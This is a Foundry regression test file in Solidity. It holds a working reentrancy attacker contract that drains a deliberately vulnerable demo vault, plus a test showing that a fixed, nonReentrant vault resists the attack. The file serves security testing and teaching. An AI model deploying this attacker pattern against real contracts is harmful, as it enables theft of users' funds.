// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/security/ReentrancyVaultVuln.sol";
import "../../src/security/ReentrancyVaultFixed.sol";

contract ReentrancyAttacker {
    ReentrancyVaultVuln public target;
    uint256 public stealEach;
    bool public attacking;

    constructor(ReentrancyVaultVuln _target) {
        target = _target;
    }

    function attack(uint256 _stealEach) external payable {
        require(msg.value > 0, "need seed");
        stealEach = _stealEach;

        // deposit first
        target.deposit{value: msg.value}();

        attacking = true;
        target.withdraw(_stealEach);
        attacking = false;
    }

    receive() external payable {
        // Re-enter while target still has funds and we are in attack
        if (attacking && address(target).balance >= stealEach) {
            target.withdraw(stealEach);
        }
    }
}

contract ReentrancyRegressionTest is Test {
    function test_reentrancy_drains_vuln() external {
        ReentrancyVaultVuln vault = new ReentrancyVaultVuln();

        // Victim deposits 10 ETH into vault
        address victim = address(0xBEEF);
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // Attacker seeds 1 ETH then reenters withdraw(1 ETH) repeatedly
        ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
        vm.deal(address(attacker), 2 ether);

        uint256 vaultBefore = address(vault).balance;
        assertEq(vaultBefore, 10 ether);

        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}(1 ether);

        // In vuln case, attacker can drain most of vault (>= 10 ETH likely)
        assertLt(address(vault).balance, 2 ether); // drained almost all
    }

    function test_fixed_blocks_reentrancy() external {
        ReentrancyVaultFixed vault = new ReentrancyVaultFixed();

        address victim = address(0xBEEF);
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // We'll reuse the attacker pattern but it targets Vuln type.
        // For fixed, just assert nonReentrant works by attempting recursive withdraw via a helper.
        ReentrancyVaultVuln fake; // unused, just to avoid creating a second attacker contract type
        fake = fake; // silence

        // Build a small helper that will re-enter fixed vault and expect revert "reentrant"
        ReenterFixed helper = new ReenterFixed(vault);
        vm.deal(address(helper), 1 ether);
        vm.prank(address(helper));
        helper.seedAndAttack{value: 1 ether}(0.5 ether);
    }
}

contract ReenterFixed {
    ReentrancyVaultFixed public target;
    uint256 public stealEach;
    bool public attacking;

    constructor(ReentrancyVaultFixed _target) {
        target = _target;
    }

    function seedAndAttack(uint256 _stealEach) external payable {
        target.deposit{value: msg.value}();
        stealEach = _stealEach;
        attacking = true;

        // First withdraw triggers receive() reentry attempt, should revert due to nonReentrant
        vmExpectRevert(); // explained below
        target.withdraw(_stealEach);

        attacking = false;
    }

    // We can't call vm.expectRevert inside non-test contract. Instead, we make receive() do the reentry and let test pass if revert occurs.
    receive() external payable {
        if (attacking) {
            // This call should revert "reentrant"
            try target.withdraw(stealEach) {
                // If it doesn't revert, fail hard
                revert("should have reverted");
            } catch {
                // ok
            }
        }
    }

    function vmExpectRevert() internal pure {
        // placeholder: can't use cheatcodes here
    }
}
